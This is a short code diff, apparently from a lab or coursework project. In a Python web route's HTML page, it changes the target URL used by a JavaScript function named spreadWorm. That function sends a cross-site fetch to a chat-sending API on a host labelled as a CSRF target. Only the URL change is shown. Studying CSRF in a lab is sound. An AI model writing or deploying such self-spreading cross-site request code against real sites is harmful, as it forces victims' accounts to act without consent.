@@ -16,7 +16,7 @@ def index():
             <script>
                 async function spreadWorm() {
                     // REPLACE THIS with your actual Target Render URL
-                    const TARGET_URL = 'https://csrf-target.onrender.com';
+                    const TARGET_URL = 'https://csrf-target-1.onrender.com/';
                     
                     try {
                         await fetch(`${TARGET_URL}/api/send_chat`, {
